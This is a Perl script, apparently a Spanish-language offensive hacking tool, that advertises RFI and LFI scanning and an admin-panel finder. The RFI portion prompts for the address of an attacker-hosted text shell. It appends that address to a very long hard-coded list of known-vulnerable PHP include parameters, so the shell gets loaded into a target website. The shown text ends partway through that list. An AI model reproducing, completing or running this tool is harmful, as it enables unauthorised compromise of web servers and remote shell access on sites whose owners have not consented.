#!/usr/bin/perl
#Titulo de la Tool:
#          _            ______              ______                                                 
#         (_)          / ____ `.          .' ____ \                                                
# _   __  __  _ .--.   `'  __) | _ .--.   | (___ \_| .---.  ,--.   _ .--.   _ .--.  .---.  _ .--.  
#[ \ [  ][  |[ '/'`\ \ _  |__ '.[ `/'`\]   _.____`. / /'`\]`'_\ : [ `.-. | [ `.-. |/ /__\\[ `/'`\] 
# \ \/ /  | | | \__/ || \____) | | |      | \____) || \__. // | |, | | | |  | | | || \__., | |     
#  \__/  [___]| ;.__/  \______.'[___]      \______.''.___.'\'-;__/[___||__][___||__]'.__.'[___]    
#            [__|                                                                                  
#
#
#web		 http://b4nz0k.blogspot.com
#Gretz:		 Bl4ck.Viper, priv8, xassiz, GlaDiaT0R <-Por los Paths
#Echo por:	 b4nz0k y ar3sw0rmed
#
#




if (!$ARGV[0]) {

print q(


	  88   8          eeee            8""""8                        
    88   8 e  eeeee    8  eeeee     8      eeee eeeee eeeee eeeee 
    88  e8 8  8   8    8  8   8     8eeeee 8  8 8   8 8   8 8   8 
    "8  8  8e 8eee8 eee8  8eee8e        88 8e   8eee8 8e  8 8e  8 
     8  8  88 88       88 88   8    e   88 88   88  8 88  8 88  8 
     8ee8  88 88    eee88 88   8    8eee88 88e8 88  8 88  8 88  8                                                         
                                                             


		Modo de Uso: Scanner.pl <opcion> <Host>

		Ejemplo: Scanner.pl -r http://web.com
	
		  Comando		Scanner

		  -r     		RFI Scanner
		  -l     		LFI Scanner
		  -p			Panel Finder     


*La opcion de -l y -r se puede incluir el path (http://web.com/index.php?page=)

); 

exit 1;

}
$opciones  = $ARGV[0];
$web1	   = $ARGV[1];
print q(


	  88   8          eeee            8""""8                        
    88   8 e  eeeee    8  eeeee     8      eeee eeeee eeeee eeeee 
    88  e8 8  8   8    8  8   8     8eeeee 8  8 8   8 8   8 8   8 
    "8  8  8e 8eee8 eee8  8eee8e        88 8e   8eee8 8e  8 8e  8 
     8  8  88 88       88 88   8    e   88 88   88  8 88  8 88  8 
     8ee8  88 88    eee88 88   8    8eee88 88e8 88  8 88  8 88  8                                                         

);
system ("title Scanner Perl");

use HTTP::Request;
use LWP::UserAgent;



system ("cls");

if ($opciones =~ /r/|/R/) {
##################Scanner RFI#######################
system("cls");
system("clear");
print q(

    .-..-. _       .----.        .--.                                     
    : :: ::_;      `--  ;       : .--'                                    
    : :: :.-..---.  .' ' .--.   `. `.  .--.  .--.  ,-.,-.,-.,-. .--. .--. 
    : `' ;: :: .; ` _`,`.: ..'   _`, :'  ..'' .; ; : ,. :: ,. :' '_.': ..'
    `.,' :_;: ._.'`.__.':_;    `.__.'`.__.'`.__,_;:_;:_;:_;:_;`.__.':_;  
	    : :                                                          
	    :_;                                                          
    


		+-++-++-+ +-++-++-++-++-++-++-+
		|R||F||I| |S||c||a||n||n||e||r|
		+-++-++-+ +-++-++-++-++-++-++-+


);
print "\n";



print "\n\tInserta la direccion de la shell en txt\n\t";
$shell1=<STDIN>;

if ($web1 !~ /http/)
{
$web="http://".$web1."/"; 
} else { $web=$web1."/";}

if ($shell1 !~ /http/)
{
$shell="http://".$shell1."?"; 
} else { $shell=$shell1."?";}
chop $web;
chop $shell;
print "\tEscaneando ".$web."\n\n";
print "\tCon shell ".$shell."\n\n";
print "  * > Desea ver el Proseso?\tSi/No\n\t";
$proseso=<STDIN>;
print "\tScanner en Proseso...\n\n";
chop($proseso);
if ($web =~ /\?/) { print "\t$web=\n\t$shell"; }
else { print "\t$web\n\t$shell"; }
if ($proseso =~ /n|N/) 
{ print "\n\n\t Analizando Web...."; }



#si lleva la web un signo de path como page.php?"="
if ($web =~ /\?/) {
$web=$web."=";
@paths=$shell; 
print("\n\n\n\t * Analizando la Web.... \n\n   ".$web,"\n\n");
}
else {
@paths=(
'includes/header.php?systempath=','Gallery/displayCategory.php?basepath=',
'index.inc.php?PATH_Includes=','nphp/nphpd.php?nphp_config[LangFile]=',
'include/db.php?GLOBALS[rootdp]=','ashnews.php?pathtoashnews=',
'ashheadlines.php?pathtoashnews=','modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=',
'demo/includes/init.php?user_inc=','jaf/index.php?show=',
'inc/shows.inc.php?cutepath=','poll/admin/common.inc.php?base_path=',
'pollvote/pollvote.php?pollname=','sources/post.php?fil_config=',
'modules/My_eGallery/public/displayCategory.php?basepath=','bb_lib/checkdb.inc.php?libpach=',
'include/livre_include.php?no_connectlol&chem_absolu=',
'index.php?from_marketY&pageurl=','modules/mod_mainmenu.php?mosConfig_absolute_path=',
'pivot/modules/module_db.php?pivot_path=','modules/nAlbum/public/displayCategory.php?basepath=',
'derniers_commentaires.php?rep=','modules/coppermine/themes/default/theme.php?THEME_DIR=',
'modules/coppermine/include/init.inc.php?CPG_M_DIR=','modules/coppermine/themes/coppercop/theme.php?THEME_DIR=',
'coppermine/themes/maze/theme.php?THEME_DIR=','allmylinks/include/footer.inc.php?_AMLconfig[cfg_serverpath]=',
'allmylinks/include/info.inc.php?_AMVconfig[cfg_serverpath]=',
'myPHPCalendar/admin.php?cal_dir=','agendax/addevent.inc.php?agendax_path=',
'modules/mod_mainmenu.php?mosConfig_absolute_path=','modules/PNphpBB/includes/functions_admin.php?phpbb_root_path=',
'main.php?page=','default.php?page=','index.php?action=','index.php?p=',
'index.php?x=','index.php?content=','index.php?conteudo=',
'index.php?cat=','include/new-visitor.inc.php?lvc_include_dir=',
'modules/agendax/addevent.inc.php?agendax_path=',
'shoutbox/expanded.php?conf=','modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=',
'pivot/modules/module_db.php?pivot_path=','library/editor/editor.php?root=',
'library/lib.php?root=','e/e_handlers/secure_img_render.php?p=',
'zentrack/index.php?configFile=','main.php?x=',
'becommunity/community/index.php?pageurl=','GradeMap/index.php?page=',
'phpopenchat/contrib/yabbse/poc.php?sourcedir=',
'calendar/calendar.php?serverPath=','calendar/functions/popup.php?serverPath=',
'calendar/events/header.inc.php?serverPath=',
'calendar/events/datePicker.php?serverPath=',
'calendar/setup/setupSQL.php?serverPath=','calendar/setup/header.inc.php?serverPath=',
'mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=','zentrack/index.php?configFile=',
'pivot/modules/module_db.php?pivot_path=',
'inc/header.php/step_one.php?server_inc=',
'install/index.php?lng../../include/main.inc&G_PATH=','inc/pipe.php?HCL_path=','include/write.php?dir=',
'include/new-visitor.inc.php?lvc_include_dir=',
'includes/header.php?systempath=',
'support/mailling/maillist/inc/initdb.php?absolute_path=','coppercop/theme.php?THEME_DIR=',
'zentrack/index.php?configFile=','pivot/modules/module_db.php?pivot_path=','inc/header.php/step_one.php?server_inc=',
'install/index.php?lng../../include/main.inc&G_PATH=','inc/pipe.php?HCL_path=','include/write.php?dir=',
'include/new-visitor.inc.php?lvc_include_dir=',
'includes/header.php?systempath=','support/mailling/maillist/inc/initdb.php?absolute_path=',
'coppercop/theme.php?THEME_DIR=','becommunity/community/index.php?pageurl=','shoutbox/expanded.php?conf=',
'agendax/addevent.inc.php?agendax_path=','myPHPCalendar/admin.php?cal_dir=',
'yabbse/Sources/Packages.php?sourcedir=',
'dotproject/modules/projects/addedit.php?root_dir=','dotproject/modules/projects/view.php?root_dir=',
'dotproject/modules/projects/vw_files.php?root_dir=',
'dotproject/modules/tasks/addedit.php?root_dir=',
'dotproject/modules/tasks/viewgantt.php?root_dir=','My_eGallery/public/displayCategory.php?basepath=',
'modules/My_eGallery/public/displayCategory.php?basepath=',
'modules/nAlbum/public/displayCategory.php?basepath=',
'modules/coppermine/themes/default/theme.php?THEME_DIR=','modules/agendax/addevent.inc.php?agendax_path=',
'modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=',
'modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=',
'modules/coppermine/include/init.inc.php?CPG_M_DIR=','modules/mod_mainmenu.php?mosConfig_absolute_path=',
'shoutbox/expanded.php?conf=','pivot/modules/module_db.php?pivot_path=',
'library/editor/editor.php?root=',
'library/lib.php?root=','e/e_handlers/secure_img_render.php?p=','main.php?x=','main.php?page=',
'index.php?meio.php=','index.php?include=','index.php?inc=','index.php?page=','index.php?pag=',
'index.php?p=','index.php?x=','index.php?open=','index.php?visualizar=',
'index.php?pagina=','index.php?content=','inc/step_one_tables.php?server_inc=',
'GradeMap/index.php?page=','phpshop/index.php?base_dir=','admin.php?cal_dir=',
'contacts.php?cal_dir=','convert-date.php?cal_dir=','album_portal.php?phpbb_root_path=',
'mainfile.php?MAIN_PATH=','dotproject/modules/files/index_table.php?root_dir=','html/affich.php?base=',
'gallery/init.php?HTTP_POST_VARS=','pm/lib.inc.php?pm_path=','ideabox/include.php?gorumDir=',
'index.php?includes_dir=','forums/toplist.php?phpbb_root_path=','forum/toplist.php?phpbb_root_path=',
'admin/config_settings.tpl.php?include_path=','include/common.php?include_path=','event/index.php?page=',
'forum/index.php?includeFooter=','forums/index.php?includeFooter=','forum/bb_admin.php?includeFooter=',
'forums/bb_admin.php?includeFooter=','language/lang_english/lang_activity.php?phpbb_root_path=',
'forum/language/lang_english/lang_activity.php?phpbb_root_path=','blend_data/blend_common.php?phpbb_root_path=',
'master.php?root_path=','includes/kb_constants.php?module_root_path=',
'forum/includes/kb_constants.php?module_root_path=',
'forums/includes/kb_constants.php?module_root_path=','classes/adodbt/sql.php?classes_dir=',
'agenda.php?rootagenda=','agenda.php?rootagenda=','sources/lostpw.php?CONFIG[path]=',
'topsites/sources/lostpw.php?CONFIG[path]=','toplist/sources/lostpw.php?CONFIG[path]=',
'sources/join.php?CONFIG[path]=','topsites/sources/join.php?CONFIG[path]=',
'toplist/sources/join.php?CONFIG[path]=','topsite/sources/join.php?CONFIG[path]=',
'public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=','extras/poll/poll.php?file_newsportal=',
'index.php?site_path=','mail/index.php?site_path=','fclick/show.php?path=','show.php?path=',
'calogic/reconfig.php?GLOBALS[CLPath]=','eshow.php?Config_rootdir=','auction/auction_common.php?phpbb_root_path=',
'index.php?inc_dir=','calendar/index.php?inc_dir=','modules/TotalCalendar/index.php?inc_dir=',
'modules/calendar/index.php?inc_dir=','calendar/embed/day.php?path=','ACalendar/embed/day.php?path=',
'calendar/add_event.php?inc_dir=','claroline/auth/extauth/drivers/ldap.inc.php?clarolineRepositorySys=',
'claroline/auth/ldap/authldap.php?includePath=',
'docebo/modules/credits/help.php?lang=','modules/credits/help.php?lang=',
'config.php?returnpath=','editsite.php?returnpath=','in.php?returnpath=',
'addsite.php?returnpath=',
'includes/pafiledb_constants.php?module_root_path=',
'phpBB/includes/pafiledb_constants.php?module_root_path=',
'pafiledb/includes/pafiledb_constants.php?module_root_path=',
'auth/auth.php?phpbb_root_path=','auth/auth_phpbb/phpbb_root_path=',
'apc-aa/cron.php?GLOBALS[AA_INC_PATH]=','apc-aa/cached.php?GLOBALS[AA_INC_PATH]=',
'infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=',
'phpdig/includes/config.php?relative_script_path=',
'includes/phpdig/includes/config.php?relative_script_path=',
'includes/dbal.php?eqdkp_root_path=',
'eqdkp/includes/dbal.php?eqdkp_root_path=',
'dkp/includes/dbal.php?eqdkp_root_path=',
'include/SQuery/gameSpy.php?libpath=',
'include/global.php?GLOBALS[includeBit]=',
'topsites/config.php?returnpath=',
'manager/frontinc/prepend.php?_PX_config[manager_path]=',
'ubbthreads/addpost_newpoll.php?addpollthispath=',
'forum/addpost_newpoll.php?thispath=','forums/addpost_newpoll.php?thispath=',
'ubbthreads/ubbt.inc.php?thispath=',
'forums/ubbt.inc.php?thispath=','forum/ubbt.inc.php?thispath=',
'forum/admin/addentry.php?phpbb_root_path=',
'admin/addentry.php?phpbb_root_path=','index.php?f=','index.php?act=','ipchat.php?root_path=',
'includes/orderSuccess.inc.php?glob[rootDir]=','stats.php?dir[func]dir[base]=',
'ladder/stats.php?dir[base]=',
'ladders/stats.php?dir[base]=','sphider/admin/configset.php?settings_dir=',
'admin/configset.php?settings_dir=',
'vwar/admin/admin.php?vwar_root=','modules/vwar/admin/admin.php?vwar_root=',
'modules/vWar_Account/includes/get_header.php?vwar_root=',
'modules/vWar_Account/includes/functions_common.php?vwar_root=',
'sphider/admin/configset.php?settings_dir=',
'admin/configset.php?settings_dir=','impex/ImpExData.php?systempath=',
'forum/impex/ImpExData.php?systempath=',
'forums/impex/ImpExData.php?systempath=','application.php?base_path=',
'index.php?theme_path=',
'become_editor.php?theme_path=','add.php?theme_path=',
'bad_link.php?theme_path=','browse.php?theme_path=',
'detail.php?theme_path=','fav.php?theme_path=','get_rated.php?theme_path=',
'login.php?theme_path=','mailing_list.php?theme_path=',
'new.php?theme_path=','modify.php?theme_path=',
'pick.php?theme_path=','power_search.php?theme_path=','rating.php?theme_path=','register.php?theme_path=',
'review.php?theme_path=','rss.php?theme_path=','search.php?theme_path=','send_pwd.php?theme_path=',
'sendmail.php?theme_path=','tell_friend.php?theme_path=','top_rated.php?theme_path=',
'user_detail.php?theme_path=','user_search.php?theme_path=','invoice.php?base_path=',
'cgi-bin//classes/adodbt/sql.php?classes_dir=',
'cgi-bin/install/index.php?G_PATH=','cgi-bin/include/print_category.php?dir=',
'includes/class_template.php?quezza_root_path=',
'bazar/classified_right.php?language_dir=','classified_right.php?language_dir=',
'phpBazar/classified_right.php?language_dir=',
'chat/messagesL.php?cmd=','phpMyChat/chat/messagesL.php?cmd=','bbs/include/write.php?dir=',
'visitorupload.php?cmd=','modules/center/admin/accounts/process.php?module_path]=','index.php?template=',
'armygame.php?libpath=','lire.php?rub=','pathofhostadmin/?page=','apa_phpinclude.inc.php?apa_module_basedir=',
'index.php?req_path=','research/boards/encapsbb-.._fixed/index_header.php?root=','Farsi/index.php?archive=',
'index.php?archive=','show_archives.php?template=','forum/include/common.php?pun_root=',
'pmwiki wiki/pmwiki-..beta/pmwiki.php?GLOBALS[FarmD]=','vuln.php?=','cgi-bin//include/write.php?dir=',
'admin/common.inc.php?basepath=','pm/lib.inc.php?sfx=','pm/lib.inc.php?pm_path=','artmedic-kleinanzeigen-path/index.php?id=',
'osticket/include/main.php?include_dir=','include/main.php?config[search_disp]include_dir=',
'phpcoin/config.php?_CCFG[_PKG_PATH_DBSE]=','quick_reply.php?phpbb_root_path=',
'zboard/include/write.php?dir=','admin/plog-admin-functions.php?configbasedir=',
'content.php?content=','q-news.php?id=','_conf/core/common-tpl-vars.php?confdir=','votebox.php?VoteBoxPath=',
'al_initialize.php?alpath=','include/db.php?GLOBALS[rootdp]=','modules/news/archivednews.php?GLOBALS[language_home]=',
'protection.php?siteurl=','modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]=',
'index.php?includes_dir=','classes.php?LOCAL_PATH=','extensions/moblog/moblog_lib.php?basedir=',
'modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=','phpWebLog/include/init.inc.php?G_PATH=',
'admin/objects.inc.php?Server=','trg_news/trgnews/install/article.php?dir=','block.php?Include=',
'arpuivo.php?data=','setup/index.php?GALLERY_BASEDIR=','include/help.php?base=',
'index.php?[Home]=','block.php?Include=','examples/phonebook.php?page=','PHPNews/auth.php?path=',
'include/print_category.php?dir=','skin/zero_vote/login.php?dir=','skin/zero_vote/setup.php?dir=',
'skin/zero_vote/ask_password.php?dir=','gui/include/sql.php?include_path=',
'webmail/lib/emailreader_execute_on_each_page.inc.php?emailreader_ini=',
'email.php?logincer_skin=','PhotoGal/ops/gals.php?news_file=','index.php?custom=',
'loginout.php?cutepath=','oneadmin/config.php?path[docroot]=',
'xcomic/initialize.php?xcomicRootPath=',
'skin/zero_vote/setup.php?dir=','skin/zero_vote/error.php? dir=',
'admin_modules/admin_module_captions.inc.php?config[path_src_include]=',
'admin_modules/admin_module_rotimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delcomments.inc.php?config[path_src_include]=',
'admin_modules/admin_module_edit.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_deldir.inc.php?config[path_src_include]=',
'src/index_overview.inc.php?config[path_src_include]=',
'src/index_leftnavbar.inc.php?config[path_src_include]=',
'src/index_image.inc.php?config[path_src_include]=',
'src/image-gd.class.php?config[path_src_include]=','src/image.class.php?config[path_src_include]=',
'src/album.class.php?config[path_src_include]=',
'src/show_random.inc.php?config[path_src_include]=','src/main.inc.php?config[path_src_include]='
,'src/index_passwd-admin.inc.php?config[path_admin_include]=',
'yappa-ng/src/index_overview.inc.php?config[path_src_include]=',
'admin_modules/admin_module_captions.inc.php?config[path_src_include]=',
'admin_modules/admin_module_rotimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delcomments.inc.php?config[path_src_include]=',
'admin_modules/admin_module_edit.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_deldir.inc.php?config[path_src_include]=',
'src/index_overview.inc.php?config[path_src_include]=',
'src/image-gd.class.php?config[path_src_include]=',
'src/image.class.php?config[image_module]=','src/album.class.php?config[path_src_include]=',
'src/show_random.inc.php?config[path_src_include]=',
'src/main.inc.php?config[path_src_include]=','includes/db_adodb.php?baseDir=',
'includes/db_connect.php?baseDir=','includes/session.php?baseDir=',
'modules/projects/gantt.php?dPconfig[root_dir]=',
'modules/projects/gantt.php?dPconfig[root_dir]=','modules/projects/vw_files.php?dPconfig[root_dir]=',
'modules/admin/vw_usr_roles.php?baseDir=','modules/public/calendar.php?baseDir=',
'modules/public/date_format.php?baseDir=',
'modules/tasks/gantt.php?baseDir=','mantis/login_page.php?g_meta_include_file=',
'phpgedview/help_text_vars.php?PGV_BASE_DIRECTORY=',
'modules/My_eGallery/public/displayCategory.php?basepath=','dotproject/modules/files/index_table.php?root_dir=',
'nukebrowser.php?filnavn=','bug_sponsorship_list_view_inc.php?t_core_path=',
'modules/coppermine/themes/coppercop/theme.php?THEME_DIR=',
'modules/coppermine/themes/maze/theme.php?THEME_DIR=','modules/coppermine/include/init.inc.php?CPG_M_DIR=',
'includes/calendar.php?phpc_root_path=','includes/setup.php?phpc_root_path=','phpBB/admin/admin_styles.php?mode=',
'aMember/plugins/db/mysql/mysql.inc.php?config=','admin/lang.php?CMS_ADMIN_PAGE=',
'inc/pipe.php?HCL_path=',
'include/write.php?dir=','becommunity/community/index.php?pageurl=',
'modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=',
'modules/mod_mainmenu.php?mosConfig_absolute_path=',
'modules/agendax/addevent.inc.php?agendax_path=','shoutbox/expanded.php?conf=',
'modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=','index.php?page=',
'index.php?pag=','index.php?include=','index.php?content=',
'index.php?cont=','index.php?c=','modules/My_eGallery/index.php?basepath=',
'modules/newbb_plus/class/forumpollrenderer.php?bbPath=',
'journal.php?m=','index.php?m=','links.php?c=','forums.php?m=','list.php?c=',
'user.php?xoops_redirect=','index.php?id=',
'r.php?url=','CubeCart/includes/orderSuccess.inc.php?&glob[rootDir]=',
'inc/formmail.inc.php?script_root=','include/init.inc.php?G_PATH=',
'backend/addons/links/index.php?PATH=',
'modules/newbb_plus/class/class.forumposts.php?bbPath[path]=',
'modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=',
'protection.php?siteurl=','htmltonuke.php?filnavn=','mail_autocheck.php?pm_path=',
'index.php?p=','modules/nAlbum/public/displayCategory.php?basepath=',
'e/e_handlers/secure_img_render.php?p=','include/new-visitor.inc.php?lvc_include_dir=',
'community/modules/agendax/addevent.inc.php?agendax_path=',
'library/editor/editor.php?root=','library/lib.php?root=','zentrack/index.php?configFile=',
'pivot/modules/module_db.php?pivot_path=',
'myPHPCalendar/admin.php?cal_dir=','index.php/main.php?x=','os/pointer.php?url=',
'p_uppc_francais/pages_php/p_aidcon_conseils/index.php?FM=',
'db.php?path_local=','phpGedView/individual.php?PGV_BASE_DIRECTORY=','index.php?kietu[url_hit]=',
'phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=',
'Sources/Packages.php?sourcedir=','modules/PNphpBB/includes/functions_admin.php?phpbb_root_path=',
'cgi-bin//gadgets/Blog/BlogModel.php?path=',
'modules/my_egallery/?root_path=','adminpanel/includes/add_forms/addbioform.php?root_path=',
'adminpanel/includes/add_forms/addfliersform.php?root_path=',
'adminpanel/includes/add_forms/addgenmerchform.php?root_path=',
'adminpanel/includes/add_forms/addinterviewsform.php?root_path=',
'adminpanel/includes/add_forms/addlinksform.php?root_path=',
'adminpanel/includes/add_forms/addlyricsform.php?root_path=',
'adminpanel/includes/add_forms/addmembioform.php?root_path=',
'adminpanel/includes/add_forms/addmerchform.php?root_path=',
'adminpanel/includes/add_forms/addmerchpicform.php?root_path=',
'adminpanel/includes/add_forms/addnewsform.php?root_path=',
'adminpanel/includes/add_forms/addphotosform.php?root_path=',
'adminpanel/includes/add_forms/addreleaseform.php?root_path=',
'adminpanel/includes/add_forms/addreleasepicform.php?root_path=',
'adminpanel/includes/add_forms/addrelmerchform.php?root_path=',
'adminpanel/includes/add_forms/addshowsform.php?root_path=',
'adminpanel/includes/add_forms/addreviewsform.php?root_path=',
'adminpanel/includes/add_forms/addwearmerchform.php?root_path=',
'adminpanel/includes/mailinglist/disphtmltbl.php?root_path=',
'adminpanel/includes/mailinglist/dispxls.php?root_path=',
'preload.php?configowned&func_prog=','index.php?configowned&func_prog=',
'missing.php?header_prog=','_inc/footer.php?theme_root=',
'_inc/header.php?theme_root=','_inc/pfooter.php?theme_root=',
'_inc/pheader.php?theme_root=','_inc/web_statsConfig.php?mod_dir=',
'_inc/web_statsConfig.php?php_ext=','_mods/email.php?header_prog=',
'_mods/files.php?header_prog=','_mods/headlines.php?header_prog=',
'_mods/search.php?header_prog=','_mods/topics.php?header_prog=',
'admanagerpro/common.php?ipath=','templates/deluxe/postreply.php?templatefolder=',
'templates/deluxe/posting.php?templatefolder=',
'templates/deluxe/pm/newpm.php?templatefolder=',
'templates/default/postreply.php?templatefolder=',
'templates/default/posting.php?templatefolder=',
'templates/default/pm/newpm.php?templatefolder=',
'modules/Forums/admin/index.php?phpbb_root_path=',
'modules/Forums/admin/admin_ug_auth.php?phpbb_root_path=',
'modules/Forums/admin/admin_board.php?phpbb_root_path=',
'modules/Forums/admin/admin_disallow.php?phpbb_root_path=',
'modules/Forums/admin/admin_forumauth.php?phpbb_root_path=',
'modules/Forums/admin/admin_groups.php?phpbb_root_path=',
'modules/Forums/admin/admin_ranks.php?phpbb_root_path=',
'modules/Forums/admin/admin_styles.php?phpbb_root_path=',
'modules/Forums/admin/admin_user_ban.php?phpbb_root_path=',
'modules/Forums/admin/admin_words.php?phpbb_root_path=',
'modules/Forums/admin/admin_avatar.php?phpbb_root_path=',
'modules/Forums/admin/admin_db_utilities.php?phpbb_root_path=',
'modules/Forums/admin/admin_forum_prune.php?phpbb_root_path=',
'modules/Forums/admin/admin_forums.php?phpbb_root_path=',
'modules/Forums/admin/admin_mass_email.php?phpbb_root_path=',
'modules/Forums/admin/admin_smilies.php?phpbb_root_path=',
'modules/Forums/admin/admin_ug_auth.php?phpbb_root_path=',
'modules/Forums/admin/admin_users.php?phpbb_root_path=',
'faq.php?foing_root_path=','index.php?foing_root_path=',
'list.php?foing_root_path=','login.php?foing_root_path=',
'playlist.php?foing_root_path=','song.php?foing_root_path=',
'gen_mu.php?foing_root_path=','view_artist.php?foing_root_path=',
'view_song.php?foing_root_path=','login.php?foing_root_path=',
'playlist.php?foing_root_path=',
'song.php?foing_root_path=','flash/set_na.php?foing_root_path=',
'flash/initialise.php?foing_root_path=',
'flash/get_song.php?foing_root_path=','includes/common.php?foing_root_path=',
'admin/nav.php?foing_root_path=',
'admin/main.php?foing_root_path=','admin/list_artists.php?foing_root_path=',
'admin/index.php?foing_root_path=',
'admin/genres.php?foing_root_path=','admin/edit_artist.php?foing_root_path=','admin/edit_album.php?foing_root_path=','admin/config.php?foing_root_path=',
'admin/admin_status.php?foing_root_path=','includes/header.php?systempath=','Gallery/displayCategory.php?basepath=',
'index.inc.php?PATH_Includes=','nphp/nphpd.php?nphp_config[LangFile]=','include/db.php?GLOBALS[rootdp]=',
'ashnews.php?pathtoashnews=','ashheadlines.php?pathtoashnews=','modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=',
'demo/includes/init.php?user_inc=','jaf/index.php?show=','inc/shows.inc.php?cutepath=','poll/admin/common.inc.php?base_path=',
'pollvote/pollvote.php?pollname=','sources/post.php?fil_config=','modules/My_eGallery/public/displayCategory.php?basepath=',
'bb_lib/checkdb.inc.php?libpach=','include/livre_include.php?no_connect=lol&chem_absolu=','index.php?from_market=Y&pageurl=',
'modules/mod_mainmenu.php?mosConfig_absolute_path=',
'pivot/modules/module_db.php?pivot_path=',
'modules/4nAlbum/public/displayCategory.php?basepath=',
'derniers_commentaires.php?rep=',
'modules/coppermine/themes/default/theme.php?THEME_DIR=',
'modules/coppermine/include/init.inc.php?CPG_M_DIR=',
'modules/coppermine/themes/coppercop/theme.php?THEME_DIR=',
'coppermine/themes/maze/theme.php?THEME_DIR=',
'allmylinks/include/footer.inc.php?_AMLconfig[cfg_serverpath]=','allmylinks/include/info.inc.php?_AMVconfig[cfg_serverpath]=',
'myPHPCalendar/admin.php?cal_dir=','agendax/addevent.inc.php?agendax_path=','modules/mod_mainmenu.php?mosConfig_absolute_path=',
'modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=','main.php?page=','default.php?page=','index.php?action=',
'index1.php?p=','index2.php?x=','index2.php?content=','index.php?conteudo=','index.php?cat=',
'include/new-visitor.inc.php?lvc_include_dir=','modules/agendax/addevent.inc.php?agendax_path=',
'shoutbox/expanded.php?conf=','modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=','pivot/modules/module_db.php?pivot_path=',
'library/editor/editor.php?root=','library/lib.php?root=','e107/e107_handlers/secure_img_render.php?p=',
'zentrack/index.php?configFile=','main.php?x=','becommunity/community/index.php?pageurl=',
'GradeMap/index.php?page=','mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=','zentrack/index.php?configFile=',
'pivot/modules/module_db.php?pivot_path=','inc/header.php/step_one.php?server_inc=','inc/pipe.php?HCL_path=',
'include/write.php?dir=','include/new-visitor.inc.php?lvc_include_dir=','includes/header.php?systempath=',
'support/mailling/maillist/inc/initdb.php?absolute_path=','coppercop/theme.php?THEME_DIR=',
'zentrack/index.php?configFile=','pivot/modules/module_db.php?pivot_path=','inc/header.php/step_one.php?server_inc=',
'inc/pipe.php?HCL_path=','include/write.php?dir=','include/new-visitor.inc.php?lvc_include_dir=',
'includes/header.php?systempath=','support/mailling/maillist/inc/initdb.php?absolute_path=',
'coppercop/theme.php?THEME_DIR=','becommunity/community/index.php?pageurl=','shoutbox/expanded.php?conf=',
'agendax/addevent.inc.php?agendax_path=','myPHPCalendar/admin.php?cal_dir=','yabbse/Sources/Packages.php?sourcedir=',
'path_of_cpcommerce/_functions.php?prefix=','dotproject/modules/projects/addedit.php?root_dir=',
'dotproject/modules/projects/view.php?root_dir=','dotproject/modules/projects/vw_files.php?root_dir=',
'dotproject/modules/tasks/addedit.php?root_dir=','dotproject/modules/tasks/viewgantt.php?root_dir=',
'My_eGallery/public/displayCategory.php?basepath=','modules/My_eGallery/public/displayCategory.php?basepath=',
'modules/4nAlbum/public/displayCategory.php?basepath=','modules/coppermine/themes/default/theme.php?THEME_DIR=',
'modules/agendax/addevent.inc.php?agendax_path=','modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=',
'modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=','modules/coppermine/include/init.inc.php?CPG_M_DIR=',
'modules/mod_mainmenu.php?mosConfig_absolute_path=',
'shoutbox/expanded.php?conf=','pivot/modules/module_db.php?pivot_path=',
'library/editor/editor.php?root=','library/lib.php?root=','e107/e107_handlers/secure_img_render.php?p=',
'main.php?x=','main.php?page=','default.php?page=','index.php?meio.php=',
'index.php?include= ','index.php?inc= ','index.php?page= ','index.php?pag= ',
'index.php?p=','index.php?x=','index.php?open= ','index.php?open=','index.php?visualizar=',
'index.php?pagina=','index.php?content=','index.php?cont=','index.php?c=',
'index.php?meio=','index.php?x=','index.php?cat=','index.php?site=','index.php?configFile=',
'index.php?action=','index.php?do=','index2.php?x=','index2.php?content=','template.php?pagina=',
'inc/step_one_tables.php?server_inc=','GradeMap/index.php?page=','phpshop/index.php?base_dir=',
'admin.php?cal_dir=','path_of_cpcommerce/_functions.php?prefix=','contacts.php?cal_dir=',
'convert-date.php?cal_dir=','album_portal.php?phpbb_root_path=','mainfile.php?MAIN_PATH=',
'dotproject/modules/files/index_table.php?root_dir=','html/affich.php?base=',
'gallery/init.php?HTTP_POST_VARS=','pm/lib.inc.php?pm_path=','ideabox/include.php?gorumDir=',
'index2.php?includes_dir=','forums/toplist.php?phpbb_root_path=','forum/toplist.php?phpbb_root_path=',
'admin/config_settings.tpl.php?include_path=','include/common.php?include_path=',
'event/index.php?page=','forum/index.php?includeFooter=','forums/index.php?includeFooter=',
'forum/bb_admin.php?includeFooter=','forums/bb_admin.php?includeFooter=',
'language/lang_english/lang_activity.php?phpbb_root_path=',
'forum/language/lang_english/lang_activity.php?phpbb_root_path=',
'blend_data/blend_common.php?phpbb_root_path=','master.php?root_path=',
'includes/kb_constants.php?module_root_path=','forum/includes/kb_constants.php?module_root_path=',
'forums/includes/kb_constants.php?module_root_path=','classes/adodbt/sql.php?classes_dir=',
'agenda.php3?rootagenda=','agenda2.php3?rootagenda=','sources/lostpw.php?CONFIG[path]=',
'topsites/sources/lostpw.php?CONFIG[path]=','toplist/sources/lostpw.php?CONFIG[path]=',
